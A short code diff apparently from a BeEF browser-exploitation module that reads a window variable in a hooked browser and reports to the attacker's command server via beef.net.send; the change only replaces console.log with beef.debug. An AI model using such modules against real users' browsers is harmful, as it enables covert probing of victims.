@@ -14,7 +14,7 @@ beef.execute(function() {
  var curl = "<%= @command_url %>";
  var cid = "<%= @command_id %>";
  
- console.log("The current value of " + payload + " is " + Window[payload]);
+ beef.debug("The current value of " + payload + " is " + Window[payload]);
  beef.net.send(curl, parseInt(cid),'get_variable=true');
 
 });
